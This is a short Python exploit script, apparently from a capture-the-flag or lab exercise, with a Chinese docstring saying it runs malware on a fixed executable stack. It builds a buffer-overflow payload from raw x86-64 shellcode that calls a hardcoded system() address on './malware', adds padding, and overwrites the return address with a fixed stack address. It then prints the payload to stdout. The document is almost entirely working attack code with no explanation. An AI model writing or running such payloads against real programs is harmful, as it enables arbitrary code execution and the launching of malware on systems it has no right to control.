#!/usr/bin/env python3
"""在固定的可执行栈上执行 malware。"""
import struct
import sys

pack = struct.pack
stack = 0x721000800FD0
system = 0x4017E0
code = (b"\x48\x8d\x3d\x19\x00\x00\x00" + b"\x48\xb8" + pack("<Q", system)
        + b"\xff\xd0" + b"\xb0\x3c\x0f\x05" + b"\x90")
payload = code.ljust(24, b"\x90") + pack("<Q", stack) + b"./malware\x00"

sys.stdout.buffer.write(payload)
